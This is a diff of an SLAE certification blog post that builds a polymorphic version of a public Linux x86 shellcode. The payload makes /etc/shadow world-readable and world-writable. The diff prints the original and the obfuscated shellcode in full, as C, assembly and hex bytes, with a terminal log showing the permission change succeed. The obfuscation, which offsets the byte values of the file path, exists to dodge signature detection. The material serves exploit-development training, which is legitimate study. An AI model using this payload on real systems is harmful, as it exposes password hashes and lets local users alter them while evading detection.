@@ -1,48 +1,56 @@
-http://shell-storm.org/shellcode/files/shellcode-556.php
+Objective 
 
-Actual Shellcode ; we are gonna make some obfusication
+This shellcode is to assign /etc/shadow file 0666 permission.Glancing over the code we could see that the code is written quiet nicely. we will try to make a polymorphic version by adding some junk operations 
 
-#include <stdio.h>
+Original Reference
+    :http://shell-storm.org/shellcode/files/shellcode-556.php
+
+    #include <stdio.h>
  
-/*
-    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
-    written by ka0x - <ka0x01[alt+64]gmail.com>
-    lun sep 21 17:13:25 CEST 2009
+    /*
+        linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
+        written by ka0x - <ka0x01[alt+64]gmail.com>
+        lun sep 21 17:13:25 CEST 2009
  
-    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
+        greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
  
-*/
+    */
  
-int main()
-{
+    int main()
+    {
  
-    char shellcode[] =
-            "\x31\xc0"          // xor eax,eax
-            "\x50"              // push eax
-            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
-            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
-            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
-            "\x89\xe3"          // mov ebx,esp
-            "\x66\x68\xb6\x01"      // push word 0x1b6
-            "\x59"              // pop ecx
-            "\xb0\x0f"          // mov al,0xf
-            "\xcd\x80"          // int 0x80
-            "\xb0\x01"          // mov al,0x1
-            "\xcd\x80";         // int 0x80
+        char shellcode[] =
+            "\x31\xc0"                  // xor eax,eax                        # clear eax register
+            "\x50"                      // push eax                           # push null  
+            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461              # push "owda"
+            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f              # push "hs//"
+            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f              # push "cte/"
+            "\x89\xe3"                  // mov ebx,esp                        #
+            "\x66\x68\xb6\x01"          // push word 0x1b6                    # file permission in octal , converted to hex
+            "\x59"                      // pop ecx                            #
+            "\xb0\x0f"                  // mov al,0xf                         #chmod sys call value
+            "\xcd\x80"                  // int 0x80                           #chmod syscall chmod() int chmod(const char *pathname, mode_t mode);
+                                                                              #                          chmod(*/etc/shadow ,0666 )  
+            "\xb0\x01"                  // mov al,0x1                         #Exit sys call
+            "\xcd\x80";                 // int 0x80                           #
  
-    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
-    (*(void(*)()) shellcode)();
+        printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
+        (*(void(*)()) shellcode)();
      
-    return 0;
-}
+        return 0;
+    }
 
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ cat chmod.asm
-global _start
+    Lets add some Junk Operation.
+    The concept applied here is substract 1 from each byte of /etc/shadow hex representation and pushed the result on to the stack.Then we increment 1 to each byte values while they are in stack
+    and then call chmod syscall
+
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ cat chmod.asm
+    global _start
 
 
-section .text
+    section .text
 
-_start:
+    _start:
 
         xor ecx,ecx
         mul ecx
@@ -55,33 +63,47 @@ _start:
         mov ebx ,esp
         push eax
 
-        push word 0x1b6
+        push word 0x1b6         ;permisson octal(666) in hex()
         pop ecx
 
-        add dword [ebx],0x11111111
+        add dword [ebx],0x11111111         ; increment 1 with each byte to make the /etc/shadow representation back to original        
         add dword [ebx+4],0x11111111
         add dword [ebx+8],0x11111111
 
-        mov al,0xf              ; permisson 666 in octal
+        mov al,0xf               ;chmod syscall
         int 0x80
 
-        mov al,0x1
+        mov al,0x1               ;exit syscall
         int 0x80
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
 
+Lets grab the shellcode    
 
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ objdump -d ./chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/
+    $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+    "\x31\xc9\xf7\xe1\x50\x68\x50\x53\x5e\x66\x68\x1e\x1e\x62\x57\x68\x1e\x54\x63\x52\x89\xe3\x50\x66\x68\xb6\x01\x59\x81\x03\x11\x11\x11\x11\x81\x43\x04\x11\x11\x11\x11\x81\x43\x08\x11\x11\x11\x11\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
 
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ objdump -d ./chmod|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/
-$//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc9\xf7\xe1\x50\x68\x50\x53\x5e\x66\x68\x1e\x1e\x62\x57\x68\x1e\x54\x63\x52\x89\xe3\x50\x66\x68\xb6\x01\x59\x81\x03\x11\x11\x11\x11\x81\x43\x04\x11\x11\x11\x11\x81\x43\x08\x11\x11\x11\x11\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ nano shellcodetest.c
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo chmod 600 /etc/shadow
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
--rw------- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo ./shellcode
-shellcode length: 56
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
--rw-rw-rw- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
-toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
+Lets run the shellcode in c wrapper program to see if its working
+
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ nano shellcodetest.c
+    
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo chmod 600 /etc/shadow
+    
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
+    
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
+    -rw------- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
+    
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ sudo ./shellcode
+    shellcode length: 56
+    
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$ ls -al /etc/shadow
+    -rw-rw-rw- 1 root shadow 1003 Nov 18 01:35 /etc/shadow
+    toor@ubuntu:~/Desktop/slae/Assignments/6/chmod$
+
+Github Repo
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE-1509
+
 
